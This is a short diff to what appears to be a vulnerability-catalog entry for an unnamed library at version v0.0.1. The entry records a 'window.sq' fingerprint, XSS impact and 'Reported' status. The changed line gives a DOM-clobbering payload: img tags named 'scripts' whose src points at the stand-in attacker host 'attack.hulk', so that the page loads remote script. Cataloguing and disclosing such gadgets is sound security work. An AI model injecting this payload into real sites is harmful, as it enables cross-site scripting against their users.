@@ -6,7 +6,7 @@
 + Stars: 1.2K
 + Version: v0.0.1
 + Fingerprint: `typeof window.sq !== 'undefined'`
-+ Payload: ```<img name="scripts" src="http://xxx.xxx.xxx"><img name="scripts" src="http://xxx.xxx.xxx">```
++ Payload: ```<img name="scripts" src="http://attack.hulk"><img name="scripts" src="http://attack.hulk">```
 + Impact: XSS
 + Status: Reported
 + CVE: N/A
